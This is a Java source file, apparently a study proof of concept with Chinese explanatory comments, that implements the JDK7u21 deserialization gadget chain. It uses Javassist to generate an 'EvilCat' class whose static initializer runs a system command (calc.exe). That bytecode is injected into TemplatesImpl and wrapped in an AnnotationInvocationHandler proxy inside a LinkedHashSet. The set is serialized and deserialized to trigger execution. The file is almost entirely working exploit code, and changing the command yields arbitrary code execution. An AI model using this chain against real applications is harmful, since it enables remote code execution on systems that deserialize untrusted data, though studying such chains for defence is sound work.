package org.example.java_7u21;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.security.utils.Base64;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Map;
import javax.xml.transform.Templates;


public class JDK7u21 {
    public static void main(String[] args) throws Exception {
        // ClassPool是 CtClass 对象的容器。实例化一个ClassPool容器。
        ClassPool pool = ClassPool.getDefault();
        // 向容器中的类搜索路径的起始位置插入AbstractTranslet.class，个人认为是方便让后面能够找到这个类
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        // 使用容器新建一个CtClass，相当于新建一个class，类名为Cat
        CtClass cc = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
        // 给这个类创建 static 代码块，并插入到类中
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        // 重新设置类名为一个随机的名字
        cc.setName(randomClassName);
        // 给这个类添加一个父类，即继承该父类。
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错
        // 将这个类输出到项目目录下
        cc.writeFile("./");
        // 将这个class转换为字节数组
        byte[] code = cc.toBytecode();


        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{code});
        setFieldValue(templates, "_name", "So4ms");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        HashMap map = new HashMap();
        map.put("f5a5a608", templates);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Templates.class, map);

        Templates proxy = (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), new Class[]{Templates.class}, handler);

        HashSet set = new LinkedHashSet();
        set.add(templates);
        set.add(proxy);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(set);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}